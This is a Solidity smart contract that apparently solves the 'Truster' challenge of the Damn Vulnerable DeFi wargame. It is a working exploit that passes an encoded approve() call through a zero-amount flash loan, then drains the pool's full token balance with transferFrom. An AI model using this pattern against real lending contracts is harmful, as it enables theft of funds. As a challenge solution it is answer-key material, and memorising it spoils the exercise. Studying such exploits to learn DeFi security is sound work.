// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

// Our contract to spoof TrusterLenderPool
contract TrusterHack {
  TrusterLenderPool public pool;
  DamnValuableToken public token;
  uint256 public targetBalance;
  address public owner;

  constructor(address payable _pool) {
    pool = TrusterLenderPool(_pool);
    token = pool.token();
    targetBalance = token.balanceOf(address(pool));
    owner = msg.sender;
  }

  function attackTarget() external {
    require(msg.sender == owner, 'Owner Only');

    // approval payload to give as data to flashLoan
    bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), targetBalance);

    // 0 flashloan so no repay, target is token so we send our approve payload to it
    pool.flashLoan(0, owner, address(token), approvePayload);

    // Now payload delivered, this address should be approved from pool for full balance
    // so xfer it to my player address to pass test
    token.transferFrom(address(pool), owner, targetBalance);
  }

}
